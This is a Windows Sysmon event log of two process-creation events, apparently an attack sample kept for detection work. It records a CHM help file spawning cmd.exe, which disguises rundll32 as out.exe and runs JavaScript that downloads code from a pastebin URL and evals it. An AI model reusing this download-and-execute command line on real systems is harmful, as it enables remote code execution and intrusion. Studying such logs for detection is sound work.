<root>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-07-26T07:39:14.375565400Z" />
      <EventRecordID>4348</EventRecordID>
      <Correlation />
      <Execution ProcessID="5924" ThreadID="6056" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>MSEDGEWIN10</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-07-26 07:39:14.345</Data>
      <Data Name="ProcessGuid">{747F3D96-AE22-5D3A-0000-001096B24E00}</Data>
      <Data Name="ProcessId">1504</Data>
      <Data Name="Image">C:\Windows\hh.exe</Data>
      <Data Name="FileVersion">10.0.17763.1 (WinBuild.160101.0800)</Data>
      <Data Name="Description">Microsoft« HTML Help Executable</Data>
      <Data Name="Product">HTML Help</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\hh.exe" C:\Users\IEUser\Desktop\Fax Record N104F.chm</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Desktop\</Data>
      <Data Name="User">MSEDGEWIN10\IEUser</Data>
      <Data Name="LogonGuid">{747F3D96-ABD5-5D3A-0000-0020EB990F00}</Data>
      <Data Name="LogonId">0xf99eb</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=4B1E2F8EFBECB677080DBB26876311D9E06C5020,MD5=1CECEE8D02A8E9B19D3A1A65C7A2B249,SHA256=8AB2F9A4CA87575F03F554AEED6C5E0D7692FA9B5D420008A1521F7F7BD2D0A5,IMPHASH=D3D9C3E81A404E7F5C5302429636F04C</Data>
      <Data Name="ParentProcessGuid">{747F3D96-ABD7-5D3A-0000-001012661000}</Data>
      <Data Name="ParentProcessId">4940</Data>
      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
      <Data Name="ParentCommandLine">C:\Windows\Explorer.EXE</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-07-26T07:39:14.935857200Z" />
      <EventRecordID>4353</EventRecordID>
      <Correlation />
      <Execution ProcessID="5924" ThreadID="6056" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>MSEDGEWIN10</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-07-26 07:39:14.853</Data>
      <Data Name="ProcessGuid">{747F3D96-AE22-5D3A-0000-001004D84E00}</Data>
      <Data Name="ProcessId">5548</Data>
      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
      <Data Name="FileVersion">10.0.17763.1 (WinBuild.160101.0800)</Data>
      <Data Name="Description">Windows Command Processor</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\System32\cmd.exe" /c copy /Y C:\Windows\system32\rundll32.exe %%TEMP%%\out.exe &gt; nul &amp;&amp; %%TEMP%%\out.exe javascript:"\..\mshtml RunHTMLApplication ";document.write();h=new%%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://pastebin.com/raw/y2CjnRtH",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im out.exe",0,true);}</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Desktop\</Data>
      <Data Name="User">MSEDGEWIN10\IEUser</Data>
      <Data Name="LogonGuid">{747F3D96-ABD5-5D3A-0000-0020EB990F00}</Data>
      <Data Name="LogonId">0xf99eb</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18</Data>
      <Data Name="ParentProcessGuid">{747F3D96-AE22-5D3A-0000-001096B24E00}</Data>
      <Data Name="ParentProcessId">1504</Data>
      <Data Name="ParentImage">C:\Windows\hh.exe</Data>
      <Data Name="ParentCommandLine">"C:\Windows\hh.exe" C:\Users\IEUser\Desktop\Fax Record N104F.chm</Data>
    </EventData>
  </Event>
</root>